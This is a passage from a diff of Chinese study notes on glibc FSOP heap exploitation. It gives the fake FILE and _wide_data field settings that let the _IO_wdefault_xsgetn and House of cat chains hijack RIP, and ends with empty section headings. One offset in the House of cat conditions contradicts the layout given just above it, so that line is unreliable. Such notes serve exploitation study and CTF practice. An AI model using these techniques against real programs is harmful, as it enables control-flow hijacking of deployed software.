+- `_wide_data->_IO_read_ptr >= _wide_data->_IO_read_end`，即满足`*A >= *(A + 8)`
+- `_wide_data->_IO_buf_base`设置为`0`，即满足`*(A + 0x30) = 0`
+- `_wide_data->_IO_save_base`设置为`0`或者合法的可被`free`的地址，即满足`*(A + 0x40) = 0`
+- `_wide_data->_wide_vtable`设置为可控堆地址`B`，即满足`*(A + 0xe0) = B`
+- `_wide_data->_wide_vtable->doallocate`设置为地址`C`用于劫持`RIP`，即满足`*(B + 0x68) = C`
+
+③ `_IO_wdefault_xsgetn`
+
+**条件**：调用到该函数时rdx寄存器(more)不为0
+
+**利用**
+
+**调用链**：`_IO_wdefault_xsgetn` -> `__wunderflow` -> `_IO_switch_to_wget_mode `-> `_IO_WOVERFLOW` -> `*(fp->_wide_data->_wide_vtable + 0x18)(fp)`
+
+**fp设置**
+
+- `_flags`设置为`0x800`
+- `vtable`设置为`_IO_wstrn_jumps/_IO_wmem_jumps/_IO_wstr_jumps`地址（加减偏移），使其能成功调用`_IO_wdefault_xsgetn`即可。
+- `_mode`设置为大于`0`，即满足`*(fp + 0xc0) > 0`
+- `_wide_data`设置为可控堆地址`A`，即满足`*(fp + 0xa0) = A`
+- `_wide_data->_IO_read_end == _wide_data->_IO_read_ptr`设置为`0`，即满足`*(A + 8) = *A`
+- `_wide_data->_IO_write_ptr > _wide_data->_IO_write_base`，即满足`*(A + 0x20) > *(A + 0x18)`
+- `_wide_data->_wide_vtable`设置为可控堆地址`B`，即满足`*(A + 0xe0) = B`
+- `_wide_data->_wide_vtable->overflow`设置为地址`C`用于劫持`RIP`，即满足`*(B + 0x18) = C`
+
+调整fake vtable处
+
+④ `_IO_wfile_seekoff`：House of cat
+
+**利用**
+
+**调用链**：`_IO_wfile_seekoff` > `_IO_switch_to_wget_mode` > `_IO_WOVERFLOW` > `*(fp->_wide_data->_wide_vtable + 0x18)(fp)`
+
+**构造fp**
+
+- `_mode`不能为0
+
+- `_flags` 设置为 `~0x8`，如果不能保证 `_lock` 指向可读写内存则 `_flags |= 0x8000`。
+- `vtable`设置为`_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap`地址（加减偏移），使其能成功调用`_IO_wfile_seekoff`即可
+- `_wide_data`设置为可控堆地址`A`，即满足`*(fp + 0xa0) = A`
+- `_wide_data->_IO_write_ptr > _wide_data->_IO_write_base` ，即满足`*A > *(A + 8)`
+- `_wide_data->_wide_vtable`设置为可控堆地址`B`，即满足`*(A + 0xe0) = B`
+- `_wide_data->_wide_vtable->overflow`设置为地址`C`用于劫持`RIP`，即满足`*(B + 0x18) = C`
+
+##### House of Apple3
+
+
+
+#### House of Obstack
+
+
+
+#### House of Snake
+
+
+
+#### House of 魑魅魍魉
+
+
 
 ## 条件竞争
 
